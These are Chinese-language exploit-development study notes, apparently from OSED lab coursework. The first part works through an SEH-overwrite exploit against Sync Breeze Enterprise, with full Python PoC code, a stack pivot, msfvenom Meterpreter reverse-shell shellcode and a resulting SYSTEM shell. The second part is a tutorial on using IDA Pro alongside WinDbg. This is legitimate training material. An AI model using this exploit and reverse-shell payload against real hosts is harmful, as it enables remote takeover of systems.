已知跳轉偏移量為 6 個位元組，更新 PoC
```
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x41" * (size - len(inputBuffer))
```
更新 PoC 在 WinDbg 中產生存取衝突後，可以在 P/P/R instruction sequence 處設定斷點，並讓 debugger 繼續執行直到命中斷點
```dbg
0:007> r
eax=77f16b12 ebx=0132f440 ecx=1015a2f0 edx=77f16b30 esi=00000000 edi=00000000
eip=0132ff54 esp=0132f344 ebp=0132f358 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0132ff54 90              nop

0:007> t
eax=77f16b12 ebx=0132f440 ecx=1015a2f0 edx=77f16b30 esi=00000000 edi=00000000
eip=0132ff55 esp=0132f344 ebp=0132f358 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0132ff55 90              nop

0:007> t
eax=77f16b12 ebx=0132f440 ecx=1015a2f0 edx=77f16b30 esi=00000000 edi=00000000
eip=0132ff56 esp=0132f344 ebp=0132f358 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0132ff56 eb06            jmp     0132ff5e

0:007> dd 0132ff5e - 0x06
0132ff58  1015a2f0 41414141 41414141 41414141
0132ff68  41414141 41414141 41414141 41414141
0132ff78  41414141 41414141 41414141 41414141
0132ff88  41414141 41414141 41414141 41414141
0132ff98  41414141 41414141 41414141 41414141
0132ffa8  41414141 41414141 41414141 41414141
0132ffb8  41414141 41414141 41414141 41414141
0132ffc8  41414141 41414141 41414141 41414141
```
查看堆疊邊界 !teb 顯示目前 thread 的 TEB 相關資訊
```dbg
0:007> dd eip L30
0132ff56  a2f006eb 41411015 41414141 41414141
0132ff66  41414141 41414141 41414141 41414141
0132ff76  41414141 41414141 41414141 41414141
0132ff86  41414141 41414141 41414141 41414141
0132ff96  41414141 41414141 41414141 41414141
0132ffa6  41414141 41414141 41414141 41414141
0132ffb6  41414141 41414141 41414141 41414141
0132ffc6  41414141 41414141 41414141 41414141
0132ffd6  41414141 ff004141 008d0132 ffff77ed
0132ffe6  6c77ffff 000077f1 00000000 3e100000
0132fff6  7170005b 000000a0 ???????? ????????
01330006  ???????? ???????? ???????? ????????

0:007> !teb
TEB at 7ffd8000
    ExceptionList:        0132f34c
    StackBase:            01330000
    StackLimit:           0132e000
...
```
> ```
> TEB at 7ffd8000
>    ExceptionList: 0132f34c
>    StackBase:     01330000
>    StackLimit:    0132e000
> ```
> - `ExceptionList`: 0132f34c` 目前 thread 例外處理鏈的相關指標
> - `StackBase`: 01330000 thread 堆疊的上界
> - `StackLimit`: 0132e000  目前堆疊的另一端邊界
> 
> 兩個值可以協助判斷目前觀察到的記憶體位址是否位於該 thread 的堆疊範圍內

這點小空間或許能裝下一個小型 shellcode，但更傾向在漏洞中使用反向 shellcode\
修改 PoC 發送了大量資料（1000 bytes），再透過搜尋堆疊看看能不能找到
```pyhton
...
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  shellcode = b"\x43" * 400

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
  inputBuffer+= shellcode
...
```
Windbg:
```dbg
0:010> t
eax=77e93b02 ebx=067fef00 ecx=1015a2f0 edx=77e93b20 esi=00000000 edi=00000000
eip=067fff56 esp=067fee04 ebp=067fee18 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
067fff56 eb06            jmp     067fff5e

0:010> t
eax=77e93b02 ebx=067fef00 ecx=1015a2f0 edx=77e93b20 esi=00000000 edi=00000000
eip=067fff5e esp=067fee04 ebp=067fee18 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
067fff5e 90              nop


0:010> !teb
TEB at 00392000
    ExceptionList:        067fee0c
    StackBase:            06800000
    StackLimit:           067fe000
...

0:010> s -b 067fe000 06800000 90 90 90 90 43 43 43 43 43 43 43 43
067ffc70  90 90 90 90 43 43 43 43-43 43 43 43 43 43 43 43  ....CCCCCCCCCCCC
```
> - `s -b <start> <end> <byte pattern>`: 
>    - `s`：搜尋記憶體
>    - `-b`：以位元組為單位搜尋
>    - `067fe000`：搜尋起始位址
>    - `06800000`：搜尋結束邊界
>    - 後面是一串要比對的位元組
>
> 表示在 0x067ffc70 找到與指定模式相符的資料，也代表先前傳送的測試資料確實出現在搜尋的堆疊範圍中

計算堆疊偏移
```dbg
0:010> ? 067ffc74 - @esp
Evaluate expression: 3696 = 00000e70
```
比較兩個記憶體位置之間的距離，0xE70 轉成十進位就是 3696

>[!note]
>1. 理解 ADD SP 與 JMP ESP 的差別:
>`add esp, 0xe70` 與 `add sp, 0xe70` 兩條指令很相似，但操作的暫存器寬度不同
>    - ESP 是 32 位元堆疊指標
>    - SP 是 ESP 的低 16 位元
>
> 因此 `add esp, 0xe70` 是對完整的 32 位元 ESP 加上 0xE70 
> 而 `add sp, 0xe70` 只會對低 16 位元的 SP 做加法\
> (若低 16 位元的加法發生進位，這種操作與完整 32 位元加法的結果不同)
>```
>┌──(chw💲CHW)-[~]
>└─$ msf-nasm_shell
>[2026-10-27 05:26:41] msf-nasm_shell
>nasm > add sp, 0xe70
>00000000  6681C4700E        add sp,0xe70
>nasm > jmp esp
>00000000  FFE4              jmp esp
>```
>
>2. 理解 JMP ESP
>JMP ESP 的意思是將目前的指令指標設定為 ESP 的值，從 ESP 指向的記憶體位置繼續執行

把 PoC 利用 `jmp esp` 將執行流程重新導向到 shellcode
```python
...
try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  shellcode = b"\x90" * 8
  shellcode+= b"\x43" * (400 - len(shellcode))

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x90" * 3
  inputBuffer+= b"\x66\x81\xC4\x70\x0e"   # add sp, 0xe70

  inputBuffer+= b"\xff\xe4"               # jmp esp
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
  inputBuffer+= shellcode
...
```
單步執行 ADD operation
```dbg
0:010> t
eax=77e93b02 ebx=01b2ef00 ecx=1015a2f0 edx=77e93b20 esi=00000000 edi=00000000
eip=01b2ff5f esp=01b2ee04 ebp=01b2ee18 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
01b2ff5f 6681c4700e      add     sp,0E70h

0:010> t
eax=77e93b02 ebx=01b2ef00 ecx=1015a2f0 edx=77e93b20 esi=00000000 edi=00000000
eip=01b2ff64 esp=01b2fc74 ebp=01b2ee18 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
01b2ff64 ffe4            jmp     esp {01b2fc74}

0:010> dd @esp L4
01cafc74  90909090 90909090 43434343 43434343

0:010> t
eax=77383b02 ebx=01caf540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000
eip=01cafc74 esp=01cafc74 ebp=01caf458 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
01cafc74 90              nop
```

### Obtaining a Shell
利用 msfvenom 產生 [Meterpreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/) payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=443 -b "\x00\x02\x0A\x0D" -f python -v shellcode
```
![image](https://hackmd.io/_uploads/B16A-g0hfg.png)

產生 payload 後要排除 bad characters
```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x02\x0A\x0D" -f python -v shellcode
  shellcode = b"\x90" * 20
  shellcode += b""
  shellcode += b"\xdb\xdd\xb8\xb3\xe9\xc8\x0b\xd9\x74\x24\xf4"
  shellcode += b"\x5b\x29\xc9\xb1\x56\x31\x43\x18\x03\x43\x18"
  shellcode += b"\x83\xeb\x4f\x0b\x3d\xf7\x47\x4e\xbe\x08\x97"
  shellcode += b"\x2f\x36\xed\xa6\x6f\x2c\x65\x98\x5f\x26\x2b"
  shellcode += b"\x14\x2b\x6a\xd8\xaf\x59\xa3\xef\x18\xd7\x95"
  shellcode += b"\xde\x99\x44\xe5\x41\x19\x97\x3a\xa2\x20\x58"
  shellcode += b"\x4f\xa3\x65\x85\xa2\xf1\x3e\xc1\x11\xe6\x4b"
  shellcode += b"\x9f\xa9\x8d\x07\x31\xaa\x72\xdf\x30\x9b\x24"
  shellcode += b"\x54\x6b\x3b\xc6\xb9\x07\x72\xd0\xde\x22\xcc"
  shellcode += b"\x6b\x14\xd8\xcf\xbd\x65\x21\x63\x80\x4a\xd0"
  shellcode += b"\x7d\xc4\x6c\x0b\x08\x3c\x8f\xb6\x0b\xfb\xf2"
  shellcode += b"\x6c\x99\x18\x54\xe6\x39\xc5\x65\x2b\xdf\x8e"
  shellcode += b"\x69\x80\xab\xc9\x6d\x17\x7f\x62\x89\x9c\x7e"
  shellcode += b"\xa5\x18\xe6\xa4\x61\x41\xbc\xc5\x30\x2f\x13"
  shellcode += b"\xf9\x23\x90\xcc\x5f\x2f\x3c\x18\xd2\x72\x28"
  shellcode += b"\xed\xdf\x8c\xa8\x79\x57\xfe\x9a\x26\xc3\x68"
  shellcode += b"\x96\xaf\xcd\x6f\xaf\xb8\xed\xa0\x17\xa8\x13"
  shellcode += b"\x41\x67\xe0\xd7\x15\x37\x9a\xfe\x15\xdc\x5a"
  shellcode += b"\xfe\xc3\x48\x51\x68\x2c\x24\x13\x6d\xc4\x36"
  shellcode += b"\xdc\x6c\xaf\xbf\x3a\x3e\x9f\xef\x92\xff\x4f"
  shellcode += b"\x4f\x43\x68\x9a\x40\xbc\x88\xa5\x8b\xd5\x23"
  shellcode += b"\x4a\x65\x8d\xdb\xf3\x2c\x45\x7d\xfb\xfb\x23"
  shellcode += b"\xbd\x77\x09\xd3\x70\x70\x78\xc7\x65\xe7\x82"
  shellcode += b"\x17\x76\x82\x82\x7d\x72\x04\xd5\xe9\x78\x71"
  shellcode += b"\x11\xb6\x83\x54\x22\xb1\x7c\x29\x12\xc9\x4b"
  shellcode += b"\xbf\x1a\xa5\xb3\x2f\x9a\x35\xe2\x25\x9a\x5d"
  shellcode += b"\x52\x1e\xc9\x78\x9d\x8b\x7e\xd1\x08\x34\xd6"
  shellcode += b"\x85\x9b\x5c\xd4\xf0\xec\xc2\x27\xd7\x6e\x04"
  shellcode += b"\xd7\xa5\x58\xad\xbf\x55\xd9\x4d\x3f\x3c\xd9"
  shellcode += b"\x1d\x57\xcb\xf6\x92\x97\x34\xdd\xfa\xbf\xbf"
  shellcode += b"\xb0\x49\x5e\xbf\x98\x0c\xfe\xc0\x2f\x95\xf1"
  shellcode += b"\xbb\x40\x2a\xf2\x3b\x49\x4f\xf3\x3b\x75\x71"
  shellcode += b"\xc8\xed\x4c\x07\x0f\x2e\xeb\x18\x3a\x13\x5a"
  shellcode += b"\xb3\x44\x07\x9c\x96"
  shellcode+= b"\x43" * (400 - len(shellcode))

  inputBuffer = b"\x41" * 124
  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
  inputBuffer+= b"\x90" * 2
  inputBuffer+= b"\x66\x81\xC4\x70\x0e"   # add sp, 0xe70
  inputBuffer+= b"\xff\xe4"               # jmp esp
  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
  inputBuffer+= shellcode

  header =  b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer 

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```
Windbg 程式再次發生 Access Violation:
```dbg
(424.95c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=41414141 ebx=0195fa1c ecx=0195ff18 edx=0195f9d4 esi=0195ff18 edi=0195fb20
eip=00782a9d esp=0195f9a8 ebp=0195fec8 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010286
libpal!SCA_ConfigObj::Deserialize+0x1d:
00782a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????

0:008> g
```

在 Kali 利用 Metasploit handler 開啟監聽
```
┌──(chw💲CHW)-[~]
└─$ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.5; set LPORT 443; exploit"
[2026-10-27 05:48:17] sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.5; set LPORT 443; exploit"
sudo: unable to resolve host CHW: Name or service not known
[sudo] password for chw: 

PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 192.168.51.128
LPORT => 443
[*] Started reverse TCP handler on 192.168.118.5:443 
[*] Sending stage (180291 bytes) to 192.168.120.10
[*] Meterpreter session 1 opened (192.168.118.5:443 -> 192.168.120.10:49994)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

# Introduction to IDA Pro
在漏洞利用開發過程中通常拿不到目標程式的原始碼，無法直接閱讀 source code，確認程式如何處理網路封包、如何配置記憶體，或在哪裡發生漏洞。\
🥚 不代表無法分析程式。編譯後的執行檔仍然包含處理器需要執行的機器碼，可以透過逆向分析理解其行為

Industry standard [disassembler](https://en.wikipedia.org/wiki/Disassembler):
- [IDA Pro](https://www.hex-rays.com/products/ida/)
- [Ghidra](https://ghidra-sre.org/)
- [Radare](https://rada.re/n/)
- [Binary Ninja](https://binary.ninja/)

## IDA Pro 101
IDA Pro 是一款 tried-and-true disassembler，背後擁有強大的產品研發實力。 IDA Pro 反組譯軟體支援超過 60 個處理器系列\
環境範例與 OSED 考試僅能使用 [IDA Freeware](https://hex-rays.com/ida-free/#download)

![image](https://hackmd.io/_uploads/S10ioeRnMe.png)


### Installing IDA Pro
```
┌──(chw💲CHW)-[~/Downloads]
└─$ sudo ./ida-free-pc_95_armlinux.run                                                                                                             
[2026-10-27 06:12:38] sudo ./ida-free-pc_95_armlinux.run
sudo: unable to resolve host CHW: Name or service not known
[sudo] password for chw: 
----------------------------------------------------------------------------
Welcome to the IDA Free 9.5 Setup Wizard.

----------------------------------------------------------------------------
Please read the following License Agreement. You must accept the terms of this 
agreement before continuing with the installation.

Press [Enter] to continue:
Hex-Rays End User License Agreement

This End User License Agreement (“EULA”) is a binding agreement between Hex Rays
```
![image](https://hackmd.io/_uploads/B1ZLFlR3Ge.png)

```
┌──(chw💲CHW)-[~/Downloads]
└─$ ln -s /opt/ida-free-9.5/ida /usr/bin  

┌──(chw💲CHW)-[~/Downloads]
└─$ ida
```
![image](https://hackmd.io/_uploads/B1-03lRhfg.png)

### The IDA Pro User Interface

開始新的分析，或開啟先前的 IDA Pro 資料庫\
![image](https://hackmd.io/_uploads/rkXhQfRnzx.png)

將環境範例 Win 10 上的 C:\Windows\System32\notepad.exe 複製到 Kali中。切換到 IDA Pro，選擇 「新建」 ，然後在檔案對話方塊中選擇notepad.exe 

分析 32 位元 Windows EXE 或 DLL 時，應選擇 `Portable executable for 80386` 選項對應 32 位元 x86 程式
- Portable Executable（PE）：Windows 常見的執行檔與 DLL 格式
- 80386 / x86：指 32 位元 x86 處理器架構

![image](https://hackmd.io/_uploads/H1xB8zRhfg.png)

>[!tip]
>為什麼要保存資料庫？\
>![image](https://hackmd.io/_uploads/rkuwPm03fg.png)\
>假設已花了一段時間：
>- 找到某個函式
>- 替函式重新命名
>- 加入註解
>- 分析幾條條件分支
>- 確認某個函式與輸入處理有關

選取目標二進位檔案後，IDA Pro 會開始對其進行自動分析，分析完成後，IDA 會顯示檔案的 Entry Point\
![image](https://hackmd.io/_uploads/Sk-NvMA2Ge.png)\
反組譯視窗的三種檢視方式：
1. Graph view
Graph View 會將程式碼組織成多個 Basic Block（基本區塊），再以箭頭表示區塊之間的控制流程\
![image](https://hackmd.io/_uploads/B131d702zg.png)
    - 綠色和紅色箭頭分別表示條件是否滿足
    - 藍色箭頭表示只有一個可能後續區塊的基本區塊連結

2. Text view
Text view 以線性列表方式顯示反組譯結果\
![image](https://hackmd.io/_uploads/SyBRdXR3Ge.png)

Graph view 與 Text view 可用 `T` 切換\
⚠️ 新版用 S
pace（空格鍵）切換
![image](https://hackmd.io/_uploads/HkSyY7C2Mx.png)

Graph View 中也像 Text view 一樣顯示虛擬位址: `Options > General` 勾選 Line prefixes

3. Proximity view
Proximity View 是一種比較進階的檢視方式，用來瀏覽函式、全域變數與常數之間的關係\
(View > Open subviews > Proximity browser)\
![image](https://hackmd.io/_uploads/BkFLs7CnGg.png)
    - Graph View 主要呈現單一函式內部的控制流程
    - Proximity View 著重於不同程式元素之間的關聯

#### Functions Window：函式清單
用途很直接：列出 IDA 在自動分析過程中辨識到的函式
![image](https://hackmd.io/_uploads/ryO3oXC2Mg.png)\
(`sub_401000` 是 IDA 常見的預設函式名稱形式)

#### Graph Overview：圖形總覽
對戰小地圖\
![image](https://hackmd.io/_uploads/r1BDnmR3fl.png)

#### Navigation Arrows：前進與返回
IDA 視窗上方有前進與返回箭頭，可以回到先前瀏覽過的位置\
![image](https://hackmd.io/_uploads/r15HnQA2fg.png)\
對逆向分析很實用，可依序：
1. 查看某個函式
2. 跳到它呼叫的另一個函式
3. 再跳到某個全域變數或相關程式碼
4. 想返回原本的分析位置

導覽箭頭可以協助回到先前的位置

#### 恢復 IDA 的預設介面
Windows > Reset desktop

Windbg 與 IDA Pro 互補：\
![image](https://hackmd.io/_uploads/HkhWT7C3Gg.png)

### Basic Functionality
#### - Color Coding：替基本區塊上色
每個 basic block 左上角都有一個調色盤圖示\
![image](https://hackmd.io/_uploads/r11-QV03zx.png)

可以使用不同顏色標記：
- 接收網路資料的基本區塊
- 檢查輸入長度的基本區塊
- 將資料複製到區域緩衝區的基本區塊
- 可能發生越界寫入的基本區塊
- 發生錯誤時會執行的基本區塊

🌰：\
![image](https://hackmd.io/_uploads/ry8rXNRnze.png)

#### - Comments：替組合語言加入註解
IDA 的自動分析雖然可協助辨識函式、指令及控制流程，但它不一定知道原始程式碼中每個變數或函式的真正用途\

點擊 Assembly 輸入 `:`（冒號）
🌰：\
![image](https://hackmd.io/_uploads/B1vLmV0nfe.png)\
![image](https://hackmd.io/_uploads/SJ8pDE0hze.png)

#### - Rename：重新命名函式與全域變數
⚠️ IDA 非常重要的功能之一\
當 IDA 分析執行檔時，可能無法取得函式原本的名稱，會顯示 `sub_XXXXXX`\
Ex. `sub_401000`, `sub_401250`, `sub_401500` 等是 IDA 根據位址等資訊產生的預設名稱

重新命名函式：
- WAY 1: 透過 Functions 視窗
1. 找到 IDA 的 Functions 視窗
2. 找到要修改的函式
3. 按右鍵
4. 選擇 Edit function...
5. 修改函式名稱
- WAY 2:在主反組譯視窗操作
1. 將游標放在函式名稱上
2. 按下 N 鍵
3. 輸入新的名稱
4. 確認修改

![image](https://hackmd.io/_uploads/SkSCdV0nfx.png)

當函式重新命名後，IDA 會同步更新已辨識到的相關參照

#### - Bookmarks：建立書籤
正在分析一個大型函式。先在某個區塊找到輸入資料的處理位置，接著跳到另一個函式查看它的實作，然後又跳到其他位置追蹤參數。

當想回到最初的位置時，可能需要重新搜尋，或透過多次跳轉才能找到\
可以透過書籤來解決這個問題的\
(按下 `E` 再按 `M`，IDA 會開啟建立書籤的對話框)\
![image](https://hackmd.io/_uploads/HkhGFN0nMg.png)\
回到書籤: (按下 `C` 再按 `M`) 可選擇 bookmark\
![image](https://hackmd.io/_uploads/SyTPtECnGx.png)

### Search Functionality
在反組譯分析中通常不會從第一條指令開始，逐行閱讀整個程式\
先找到與目標行為相關的位置，再從那些位置開始分析

#### - Search → Text (快捷鍵：`ctrl`+`F`)\
![image](https://hackmd.io/_uploads/H1qSqE0hMe.png)\
> 搜尋特定字串

#### - Search → Immediate
在組合語言中，Immediate Value 是直接寫在指令中的常數，例如  hardcoded DWORD 或是 specific sequence of bytes\
Ex. `mov eax, 100`: 100 是 immediate value

![image](https://hackmd.io/_uploads/rk3uoER3Ge.png)
> 若已經從動態分析中發現某個特定常數，可能就會想搜尋整個程式，找出哪些指令使用它

#### - Search → Sequence of Bytes
執行檔中的機器碼是由位元組構成的 Ex. `55 8B EC 83 EC 20` 一串十六進位表示的位元組 (在某些情況下，可能已經從其他工具取得特定的位元組序列，想在 IDA 中找到它)\
![image](https://hackmd.io/_uploads/Hkje2NR3Gl.png)
- 來自 WinDbg 的機器碼
- 來自另一個反組譯工具的結果
- 從特定位置截取的程式碼位元組
- 其他靜態分析結果中的位元組序列

![image](https://hackmd.io/_uploads/SJb82NAnzl.png)

#### - 搜尋函式名稱：Functions 視窗與 Jump to Function
分析程式時已經知道某個函式的名稱，想直接找到它的位置
- WAY 1: 在 Functions window 搜尋 function names
- WAY 2: Jump 選單中的 Jump to function
![image](https://hackmd.io/_uploads/SkxxpEA2fx.png)
![image](https://hackmd.io/_uploads/HkJfpNA3zg.png)

🥚 要注意 IDA 自動辨識的函式不一定涵蓋所有實際存在的函式

#### - 搜尋全域變數：Jump by Name
同 Jump to Function。在 Jump by name 可找 global variables\
![image](https://hackmd.io/_uploads/rJM5TVChMe.png)

#### - Imports 與 Exports：搜尋匯入與匯出函式
Imports 是程式從其他模組匯入的函式\
例如，Windows 程式可能匯入一些系統 API，用於檔案操作、記憶體管理或網路通訊
Exports 是模組對外提供的函式\
其他程式或模組可以透過這些匯出介面使用它提供的功能

![image](https://hackmd.io/_uploads/rJBkANC3fe.png)

IDA Pro 擁有更強大的搜尋功能。可以使用 Cross Reference（[Xref](https://www.hex-rays.com/products/ida/support/idadoc/607.shtml)） 來偵測整個執行檔或 DLL 中特定函數或全域變數的所有使用情況:\
若要取得函數名稱或全域變數的交叉引用列表，可以使用滑鼠遊標在圖形檢視中選擇其名稱，然後按 `x`
![image](https://hackmd.io/_uploads/BJ6HC402fx.png)

>[!important]
>Xref 與一般搜尋差異：\
>![image](https://hackmd.io/_uploads/SJ0F0NAnGl.png)

## Working with IDA Pro
當動態分析不容易進行，或者想要進行純靜態分析避免動態分析造成潛在風險時（例如在 malware 逆向工程）會使用 IDA Pro\
Windbg 和 IDA Pro 如何搭配
### Static-Dynamic Analysis Synchronization
讓 IDA Pro 與 WinDbg 顯示同一個程式碼位置，方便在兩個工具之間來回切換

>[!note]
>WHAT IS **ImageBase** ?\
>Windows 的 PE（Portable Executable）格式是 EXE 與 DLL 常用的執行檔格式。PE Header 中有一個欄位叫做 `ImageBase` (記錄執行檔預期被載入記憶體的基底位址)\
>舉個 🌰：\
>假設某個執行檔的 ImageBase 是：`0x00400000`\
>程式中的某個函式相對於映像基底的偏移量是：`0x00001234`\
>剛好載入預期的位置，那該函式的執行期位址就是：
>```
>ImageBase + RVA
>= 0x00400000 + 0x00001234
>= 0x00401234
>```
>- RVA（Relative Virtual Address）：相對於 ImageBase 的虛擬位址偏移量
>- VA（Virtual Address）：process 在執行時看到的虛擬位址

當 Windows 可執行檔或 DLL 檔案被編譯和連結時，[PE header](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680547(v=vs.85).aspx) ImageBase 欄位定義載入到記憶體時的首選基底位址。通常會因為模組衝突或 [Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization) (ASLR) 等安全機制，就不會是執行時間使用的位址\
👉🏻 造成 IDA Pro 與 WinDbg Address 不同步

先在 WinDbg 中查看 Notepad 的實際載入位址\
在 Win10 上開啟 Notepad，再用 WinDbg Attach 到 Notepad 程序\
查看 Notepad 模組的起始位址
```dbg
0:006> lm m notepad
Browse full module list
start    end        module name
00f90000 00f5f000   notepad    (pdb symbols)  ...
```
![image](https://hackmd.io/_uploads/Hk0Zfk16Gg.png)

到 IDA Pro  Edit > Segments > Rebase program\
![image](https://hackmd.io/_uploads/B19Yu116fe.png)

Rebase 後，IDA Pro 會開始重新計算過程。所有位址、引用和全域變數都將與偵錯會話期間在 WinDbg 中找到的值一致

嘗試利用相同位址在 WinDbg 與 IDA 之間跳轉\
(Windbg)
```dbg
0:006> u notepad!GotoDlgProc
notepad!GotoDlgProc:
00f979e0 8bff            mov     edi,edi
00f979e2 55              push    ebp
00f979e3 8bec            mov     ebp,esp
00f979e5 81ecd4000000    sub     esp,0D4h
00f979eb a184d1f300      mov     eax,dword ptr [notepad!__security_cookie (00f3d184)]
00f979f0 33c5            xor     eax,ebp
00f979f2 8945fc          mov     dword ptr [ebp-4],eax
00f979f5 8b450c          mov     eax,dword ptr [ebp+0Ch]
```
顯示函式入口位於：`0x00F279E0`\
![image](https://hackmd.io/_uploads/SkgZa11pMx.png)

在 IDA Pro 中跳到相同位址 `g`，開啟 Jump to address 對話框，再輸入：`0x00F979E0`\
![image](https://hackmd.io/_uploads/Hk7Ppkypfx.png)\
![image](https://hackmd.io/_uploads/SkT_6yyTMe.png)

>[!tip]
>在其他分析情境中，尤其是 DLL 或啟用了 ASLR 的模組，需要另外確認實際載入基底\
>如果兩個工具中的模組基底不同，就不能直接假設同一個絕對位址指向相同的程式碼\
>⚠️ 開始同步前，先確認模組基底位址 (很重要的步驟)

### Tracing Notepad
🎯： 追蹤使用者開啟文字檔時，程式如何呼叫 Windows API 取得檔案控制代碼，再讀取檔案內容\
👉🏻 在 WinDbg 中找到 API 的實際執行位置，再利用 IDA Pro 追蹤呼叫端的程式碼，最後回到 WinDbg 驗證參數及記憶體內容

準備測試檔案，在 Windows cmd 中執行：
```powershell
C:\Tools>echo Test > C:\Tools\doc.txt
```
> (建立一個名為「Test」的文字文件)

將開啟記事本並附加 WinDbg process。要在 Windows 系統上執行任何讀取或寫入操作，通常透過 kernel32.dll 中的 CreateFileW 函數來實作

>[!note]
>CreateFileW 的用途:\
>CreateFileW 可以用來開啟既有檔案，也可以依照傳入的參數建立檔案或指定其他開啟方式\
>它的行為取決於呼叫時傳入的參數，例如：
>- 要開啟的檔案路徑
>- 讀取或寫入權限
>- 分享模式
>- 安全性相關參數
>- 檔案存在時的處理方式
>
>看到程式呼叫 CreateFileW，只能確定它正在進行檔案開啟或建立相關操作；若要知道具體行為，仍需要查看參數

在 IDA Pro 的 Imports tab 選擇 CreateFileW\
![image](https://hackmd.io/_uploads/B1s2axkTfe.png)

在 WinDbg 中對 CreateFileW 設定中斷點\
breakpoint 指定 kernel32.dll 模組
```dbg
0:006> bp kernel32!CreateFileW

0:006> g
...
Breakpoint 0 hit
eax=00000001 ebx=00bf7794 ecx=007febdc edx=77e71670 esi=00bf7794 edi=04b88178
eip=75c2c260 esp=007febec ebp=007ff02c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
KERNEL32!CreateFileW:
75c2c260 ff25a043c875    jmp     dword ptr [KERNEL32!_imp__CreateFileW (75c843a0)] ds:0023:75c843a0={KERNELBASE!CreateFileW (753461a0)}
```
>(環境設定好後，在 Notepad 中執行開啟檔案的操作)

Windbg 使用 `pt` 與 `p` 找到呼叫 CreateFileW 的 Notepad 程式碼
```dbg
0:000> pt
eax=00000640 ebx=00bf7794 ecx=3b76cea0 edx=00000000 esi=00bf7794 edi=04b88178
eip=75346201 esp=007febec ebp=007ff02c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
KERNELBASE!CreateFileW+0x61:
75346201 c21c00          ret     1Ch

0:000> p
eax=00000640 ebx=00bf7794 ecx=3b76cea0 edx=00000000 esi=00bf7794 edi=04b88178
eip=00f25085 esp=007fec0c ebp=007ff02c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
notepad!UpdateEncoding+0x5d:
00f25085 8bd8            mov     ebx,eax
```

透過 addr 可以在 IDA pro 中找到\
![image](https://hackmd.io/_uploads/S1RHrMk6Mx.png)

在 Graph view 可以看到 CreateFileW 的 basic block\
![image](https://hackmd.io/_uploads/HJlXHzJaMe.png)


>[!tip]
>IDA Pro 會將參數與 Windows API 函數進行匹配
>以註解的方式協助顯示 API 參數的名稱
>
>**API Prototype:**
>API Prototype 是函式的介面定義，描述函式名稱、參數及返回型別\
>例如，CreateFileW 的參數包含：\
>- lpFileName：檔案路徑
>- dwDesiredAccess：要求的存取權限
>- dwShareMode：分享模式
>- lpSecurityAttributes：安全性屬性
>- dwCreationDisposition：檔案存在時或不存在時的處理方式
